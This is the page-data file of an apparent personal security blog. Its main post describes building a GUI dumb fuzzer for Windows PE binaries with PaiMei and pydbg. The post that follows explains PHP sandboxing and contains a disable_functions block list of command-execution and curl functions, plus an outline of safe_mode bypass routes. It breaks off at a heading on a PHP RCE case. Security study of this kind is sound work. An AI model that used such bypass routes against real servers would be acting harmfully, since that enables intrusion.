{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/project_fuzz_/",
    "result": {"data":{"cur":{"id":"57d8c503-44bf-5e63-b7dc-21c220cacb79","html":"<h1 id=\"fuzz\" style=\"position:relative;\"><a href=\"#fuzz\" aria-label=\"fuzz permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzz</h1>\n<p><strong>Fuzzing</strong> or <strong>fuzz testing</strong> is an automated <a href=\"https://en.wikipedia.org/wiki/Software_testing\">software testing</a> technique that involves providing invalid, unexpected, or <a href=\"https://en.wikipedia.org/wiki/Random_data\">random data</a> as inputs to a <a href=\"https://en.wikipedia.org/wiki/Computer_program\">computer program</a>. The program is then monitored for exceptions such as <a href=\"https://en.wikipedia.org/wiki/Crash_(computing)\">crashes</a>, failing built-in code <a href=\"https://en.wikipedia.org/wiki/Assertion_(software_development)\">assertions</a>, or potential <a href=\"https://en.wikipedia.org/wiki/Memory_leak\">memory leaks</a>. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a <a href=\"https://en.wikipedia.org/wiki/File_format\">file format</a> or <a href=\"https://en.wikipedia.org/wiki/Communications_protocol\">protocol</a> and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are “valid enough” in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are “invalid enough” to expose <a href=\"https://en.wikipedia.org/wiki/Corner_case\">corner cases</a> that have not been properly dealt with.</p>\n<p>For the purpose of security, input that crosses a <a href=\"https://en.wikipedia.org/wiki/Trust_boundary\">trust boundary</a> is often the most interesting. For example, it is more important to fuzz code that handles the upload of a file by any user than it is to fuzz the code that parses a configuration file that is accessible only to a privileged user.</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Fuzzing\"><em>https://en.wikipedia.org/wiki/Fuzzing</em></a></p>\n<h2 id=\"fuzzer-tool\" style=\"position:relative;\"><a href=\"#fuzzer-tool\" aria-label=\"fuzzer tool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzzer tool</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token number\">1</span><span class=\"token punctuation\">.</span> Window PE <span class=\"token builtin\">file</span> fuzzing operation\n<span class=\"token number\">2</span><span class=\"token punctuation\">.</span> dumb fuzzer\n<span class=\"token number\">3</span><span class=\"token punctuation\">.</span> Customizable TestCase\n<span class=\"token number\">4</span><span class=\"token punctuation\">.</span> GUI Interface using PyQt\n<span class=\"token number\">5</span><span class=\"token punctuation\">.</span> Message Box notification when Crash <span class=\"token keyword\">is</span> detected</code></pre></div>\n<h2 id=\"required-installation\" style=\"position:relative;\"><a href=\"#required-installation\" aria-label=\"required installation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Required installation</h2>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile23.uf@9959693E5C98A9A80FBC86.exe\">PaiMei-1.1.win32.exe</a></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">######################################################################</span>\n<span class=\"token comment\">#  This file should be kept compatible with Python 2.3, see PEP 291. #</span>\n<span class=\"token comment\">######################################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"create and manipulate C data types in Python\"\"\"</span>\n\n<span class=\"token keyword\">import</span> os <span class=\"token keyword\">as</span> _os<span class=\"token punctuation\">,</span> sys <span class=\"token keyword\">as</span> _sys\n\n__version__ <span class=\"token operator\">=</span> <span class=\"token string\">\"1.1.0\"</span>\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Union<span class=\"token punctuation\">,</span> Structure<span class=\"token punctuation\">,</span> Array\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> _Pointer\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> CFuncPtr <span class=\"token keyword\">as</span> _CFuncPtr\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> __version__ <span class=\"token keyword\">as</span> _ctypes_version\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> RTLD_LOCAL<span class=\"token punctuation\">,</span> RTLD_GLOBAL\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> ArgumentError\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Structure <span class=\"token keyword\">as</span> _ctypesStructure       <span class=\"token comment\"># Add for Paimei</span>\n<span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> calcsize <span class=\"token keyword\">as</span> _calcsize\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Structure</span> <span class=\"token punctuation\">(</span>_ctypesStructure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">pass</span>                <span class=\"token comment\"># Add for Paimei</span>\n\n<span class=\"token keyword\">if</span> __version__ <span class=\"token operator\">!=</span> _ctypes_version<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"Version number mismatch\"</span><span class=\"token punctuation\">,</span> __version__<span class=\"token punctuation\">,</span> _ctypes_version<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>For compatibility with python 2.7.x version, modify the <strong>init</strong>.py file.</li>\n</ul>\n<p><code class=\"language-text\">PATH: C:\\Python27\\Lib\\ctypes\\**init**.py</code></p>\n<ul>\n<li>If you added the code in lines 17 and 19, download the rebuilt pydasm.pyd file for Python 2.7.x.</li>\n<li>After that, copy it to the C:\\Python27\\Lib\\site-packages\\pydbg folder.</li>\n</ul>\n<p>If there is an existing pydasm.pyd file, it will be overwritten.</p>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile27.uf@99B4814F5C98AB6A29F4DB.pyd\">pydasm.pyd</a></li>\n</ul>\n<p><strong>pydasm test</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pydbg\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"Hello, pydbg!\"</span></code></pre></div>\n<ul>\n<li>success!</li>\n</ul>\n<h2 id=\"options-cli\" style=\"position:relative;\"><a href=\"#options-cli\" aria-label=\"options cli permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options (CLI)</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">-</span>t<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>target <span class=\"token punctuation\">:</span> Binary to fuzz\n<span class=\"token operator\">-</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>sample <span class=\"token punctuation\">:</span> Sample folder name <span class=\"token punctuation\">(</span>Test Case <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token builtin\">help</span> <span class=\"token punctuation\">:</span> <span class=\"token builtin\">help</span></code></pre></div>\n<h2 id=\"blueprint-gui\" style=\"position:relative;\"><a href=\"#blueprint-gui\" aria-label=\"blueprint gui permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BluePrint (GUI)</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoElEQVQoz2XM+0tTARjG8fOXRESJupbToW66s7a57ezsKBYzm23ulmULF5mlJWkX7YK0bmqNLrSuphSDoDQoiCiqfyCJLlQk9EsFRYVt53zDzaLLDx/e93leeAXX2e84TnzAdvwdSuor0TOgjIEyDvUTfxgvaJgo3LxX542BfBHkC1p+Cs7uDM74MO7RTzQOzODrm8bT9QwxPo15/VNM/5jrxI1PsXc8x9XzhNCu+yhnNJQ0eM9pCN6OFA3BrbiTM1TYAuiW6NDrzUh2O8EVTkIr/zbXSXYH5QaR0iU6FhtkrMdziCPgOqkhtPacJtG9AyU5Q7mjBV1JEfoKC32JJh6cDvDqepiZGxFeZyK8yUTg8TomklEMpjrMpmoOj6ZJ3ftK+nGO9jEN4faVNB/v9BMefY/e2oK+pJhiQw1H4n6+ndrAy2QbL5JtvD26jumhNri4kSs7YhgtEqbKKhLd+9g+/oX+TJbgWQ1haPgR14ZvsnroE2VWP3pdKcZqkVCzn55YhM7WAN2xCNuiYbpCQTYHA0Saw9S5Gig3lFFkVBAHs1j2gfOgimDbDaY+sO3MsszsY5lez3Kbm0bfGup9QRRfgIamVhpXh1F8QeqbAvhWrcXmUNDpllIhNiPvmcU7CPKAiuDbk+P85GfStz4wkrqER65n4aISKivNWGqqqDVXYl9uwemw5ndLTTW1NdUYjQZKihZQViUjbZ/F0wueXhVB6lRp258lOviD4cuvSZ2/y4FjGboGbmHxTyG2TCH6p7D4Jwv7b7extkxiCz1E6swhbdGY+yVE+jVc7RpiDNr3avSPqOw+CVsOgacD5AR4NxX8yn+a66S4hhRX81NoSmjIa1WkmIotqFLrL7CuyeGOZPOkaIFrPv8nquKOank/AVcrGqV8PVvaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-8.png\"\n        title=\"./Bl-8.png\"\n        src=\"/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png\"\n        srcset=\"/static/11b0973c52b4a1db5dee5094314f7265/e9ff0/Bl-8.png 180w,\n/static/11b0973c52b4a1db5dee5094314f7265/f21e7/Bl-8.png 360w,\n/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png 720w,\n/static/11b0973c52b4a1db5dee5094314f7265/302a4/Bl-8.png 1080w,\n/static/11b0973c52b4a1db5dee5094314f7265/07a9c/Bl-8.png 1440w,\n/static/11b0973c52b4a1db5dee5094314f7265/29114/Bl-8.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB8ElEQVQoz3XMS09TQRjG8fPFlF7onJkWiYTKVS4FTEtFAkVMwMICatU2kZ6Woi2KFbysTEzcmLDxQ7jXGKPRaGShiGln/oSeA0kFF7887zt5n7FCD/fxFz8TKH3B73zCX/hI29p7VOk7sXKdjpomvP0vg9oBtWM8nLBU5i0dSy+R1V9EtiFcg8gTEDXwPYbAkVqr9hqoLYPa4hTr7sorni6WiJZ+IDYhXNGIKvRX/pCs7BG//5OE8424Z9L5yuj6HqoKqmpOsaZzH0hn33GxdIDcgEi5QbAKUwuv2RgeZ23kGoXoKM6lGE7vBOXuQdITd5q3qsl46bJ863CuDHYRVNGgCnXUAwglt+gMt9HZ1cXA8BA9A/2IsELYPgJ9c0jHu3eMmx5L5RqEcw1kXiPzBpmrI9dAzOwioinae9P0JYuMzG4S7LlJsHsOeeURkXt4Ha/nseSKQa5o3DymkRmQWZd9C4S3K8+FrCaS0ajV1r4lFw2ttJsLDeRC3UuX3dzr+K838M9D8AYE5lv7VnBaI2YN9pl0q5QmNKPJP9c8e/ObF7v73N4xHP0hUwY7ZbBiy4bIlEEkDPbkGRIGlTTIpDuLhGZsWZNcPeBq5i+jSxoR1yf3VnTKIMcNIvZ/csx1NNsxg++y4fwgTf4h9+349hDx2VedtFeB6QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-10.png\"\n        title=\"./Bl-10.png\"\n        src=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png\"\n        srcset=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/e9ff0/Bl-10.png 180w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/f21e7/Bl-10.png 360w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png 720w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/302a4/Bl-10.png 1080w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/07a9c/Bl-10.png 1440w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/29114/Bl-10.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACp0lEQVQoz0WOW28TVxRG5z9VQm1DZ+w5c86ZOeOxPa4bG8eJ4wQIhFzUpLSmVFwCCaSAUMtFUC4CqQakQoGqJFWkPvUJ8YhUqQFFlaB9QyoU0QZ7vFBMgIelb+29pU/bkhf+wz39hNS3j4nOrVI/D+EVMNfeEVwFfx19BcJrIJsw8xtcv79K895Tztx9Sfg9WGLnLbyRE6gzz8h8/YTiV7+T+WIZd3wZMbmMmPgDPbWCmX6MmXpE3PibQuMRwfSfbNr3gF3H7jBy+V8GfgBzsYMVTp4iU5tAn3xKT/Uo6Q9sHCeD81GAYxscW6HFAFvcW+xO3eS0vsFxcQKRinBFjpSIcWZXkOcgOJtgVcauMjU4Q+b4czbWjvJJIYcM8ghl8FSIkAEmyhMXy5goRuoMQhrSwsf1fOy0Rs4+JDwLwakEa772PwvxP5SOwIfVeXoLMSqIcb2wi9IRHxcrDAxuIZvvxTd5dJBbvxuEilAHVghOQvBNgrV5ssXw9jZmHnpKcxR9RU7n8GSIK0OkCskXStSHt3WL18relGo/i17zPSv4x8A/0saSswl6roU5BHbvPL6SyKCA62VwZURaGHKFMvXhUXrLNbL5Etm4TDZfRgf57qdB4yFmFoKZNpa/KyE91cZtwIZwBrvnPZRWSE8gpUC4KcLQp9pXJo6zRJHpYoyP5wk2vO/gjD4g/TmoRhtLfdrhu9ttLt15QfPHu0zv/wmnb4lo66/IgUW8/gXc6s+I/oWu+0NL6PovpCqLDO1c5HLzNhdu/kVzKaG0J8Ea2tthbC5h674XjB+CypcgtoHe8Q5/7DVrrkZfp9wOhc9g/DCM7F9lx8EW2YkOVnGsQ7q/g9MHdiXB7W+h6y3UYAu1nmuzfuvttzuv1sKutHGqYPd1kIMJrwBIUhS7ZfuiggAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-9.png\"\n        title=\"./Bl-9.png\"\n        src=\"/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png\"\n        srcset=\"/static/ddefedaf5616ff75bb74313a97d51243/e9ff0/Bl-9.png 180w,\n/static/ddefedaf5616ff75bb74313a97d51243/f21e7/Bl-9.png 360w,\n/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png 720w,\n/static/ddefedaf5616ff75bb74313a97d51243/302a4/Bl-9.png 1080w,\n/static/ddefedaf5616ff75bb74313a97d51243/07a9c/Bl-9.png 1440w,\n/static/ddefedaf5616ff75bb74313a97d51243/29114/Bl-9.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#fuzzer-tool\">Fuzzer tool</a></li>\n<li><a href=\"#required-installation\">Required installation</a></li>\n<li><a href=\"#options-cli\">Options (CLI)</a></li>\n<li><a href=\"#blueprint-gui\">BluePrint (GUI)</a></li>\n</ul>\n</div>","excerpt":"Fuzz Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a file format or protocol and distinguishes valid from invalid input. An effective fuzzer generates…","frontmatter":{"date":"December 20, 2020","title":"Development of window GUI binary fuzzing using the dump fuzzing theory.","categories":"projects","author":"Zer0Luck","emoji":"🔎"},"fields":{"slug":"/project_fuzz_/"}},"next":{"id":"faa88dfd-29eb-577f-ab7b-e30f637f4123","html":"<h1 id=\"web-application--php\" style=\"position:relative;\"><a href=\"#web-application--php\" aria-label=\"web application  php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application : PHP</h1>\n<ul>\n<li>php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요.</li>\n</ul>\n<p><a href=\"https://dnsdudrla97.github.io/web_application_rce1/\">Web Application RCE Case</a></p>\n<h1 id=\"php-security-1\" style=\"position:relative;\"><a href=\"#php-security-1\" aria-label=\"php security 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Security 1</h1>\n<ul>\n<li>다음은 PHP 보안 기법중 <code class=\"language-text\">Sandbox</code> 에 대하여 설명을 진행할께요.😛</li>\n</ul>\n<h2 id=\"php-sandbox\" style=\"position:relative;\"><a href=\"#php-sandbox\" aria-label=\"php sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Sandbox</h2>\n<aside>\n💡 SandBox 가 뭘까?\n> 애플리케이션 환경에서 대상 리눅스 명령어를 사용할 수 있는 권한이 있더라고 대상 애플리케이션이 설정한 권한 이외의 행동을 수행할 수 없게 한다.\n</aside>\n<p><strong>Disable Function</strong></p>\n<ul>\n<li>애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능</li>\n<li>공격할 수 있는 구간이 존재하여 <code class=\"language-text\">명령 실행(system, proc_open, shell_exec)</code>, <code class=\"language-text\">소켓(socket)</code> , <code class=\"language-text\">통신(curl)</code> 해당 함수들을 이용하는 경우 <code class=\"language-text\">Disable Function으로 작성할 시 공격이 어렵다.</code></li>\n</ul>\n<aside>\n💡 Sandbox 개념에서 시스템 함수들이 비활성화되어 있지만 우회하면 되겠죠?\n</aside>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\"><span class=\"token title important\"><span class=\"token punctuation\">##</span> Disable Function Example</span>\n<span class=\"token list punctuation\">-</span> exec\n<span class=\"token list punctuation\">-</span> passthru\n<span class=\"token list punctuation\">-</span> shell_exec\n<span class=\"token list punctuation\">-</span> system\n<span class=\"token list punctuation\">-</span> proc_open\n<span class=\"token list punctuation\">-</span> popen\n<span class=\"token list punctuation\">-</span> curl_exec\n<span class=\"token list punctuation\">-</span> curl_multi_exec\n<span class=\"token list punctuation\">-</span> parse_ini_file\n<span class=\"token list punctuation\">-</span> show_source</code></pre></div>\n<p><strong>Safe_Mode</strong></p>\n<ul>\n<li><code class=\"language-text\">chroot</code> 가 설정된 <code class=\"language-text\">/var/www/html</code> 디렉토리 가 웹 루트로 설정되어 쉘 명령(<code class=\"language-text\">/bin/ls, /bin/id</code>) 을 사용할 수 없게 된다.</li>\n<li>uid, gid가 다른 경우 접근할 수 없다.\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> 와 같은 파일의 경우 <code class=\"language-text\">safe_mode</code> 의 특정 옵션이 켜지면 접근할 수 없다.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">safe_mode</code> 가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\">cat /etc/php.ini | grep safe_mode</code></pre></div>\n<ul>\n<li><code class=\"language-text\">/etc</code> 밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다.</li>\n</ul>\n<p><strong>Safe_Mode Bypass</strong></p>\n<ul>\n<li>간단하게 <code class=\"language-text\">safe_mode</code> 에 대해서 설명을 했는데 이를 우회하기 위해서는 몇가지 방안이 있다.\n<ul>\n<li>Safe_Mode 취약한 함수를 사용해서 Exploit를 진행 (curl, socket, …)</li>\n</ul>\n</li>\n<li>PHP 에서 사용하는 모듈 취약점을 이용해서 Exploit을 진행\n<ul>\n<li>Mode cgi, PHP-FPM</li>\n</ul>\n</li>\n<li>PHP 에는 많은 CVE가 존재\n<ul>\n<li>모듈 취약점을 사용할시 PHP 버전에 의존하지 않아도 된다.</li>\n<li>PHP 버전과 관계 없는 해당 모듈을 사용하는 하위 버전이 전부 작동한다.</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQY012QbU/CQBCEK28FFQqlVKS0Uit9u6uNEQjw///XY3bN+cEPk5m93ZlMzivrE69JxTp+J4xynuY7xn7EcBzyMFwymqxVCwajlcJptxOWWe49090oyi/q9kJe9JjuStWeSd8MWW5J0oZ91hJvP0gPVt9l/oVhuyt5XiQaqoGtvVI1ZyTYfN441t90/Z3aXMgOliDMiOKCxTJVk7R37Np5g0DDpKVn+ztVc9Im82CPP4uZTDfKYhI9fXzBn23+jP/hvkIa/gDSuGPr6m+9UgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png\"\n        srcset=\"/static/68b2df255fae24cf0c75a2d91c56e424/e9ff0/0.png 180w,\n/static/68b2df255fae24cf0c75a2d91c56e424/f21e7/0.png 360w,\n/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png 720w,\n/static/68b2df255fae24cf0c75a2d91c56e424/58bb7/0.png 985w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"php-rce-1-day-case\" style=\"position:relative;\"><a href=\"#php-rce-1-day-case\" aria-label=\"php rce 1 day case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 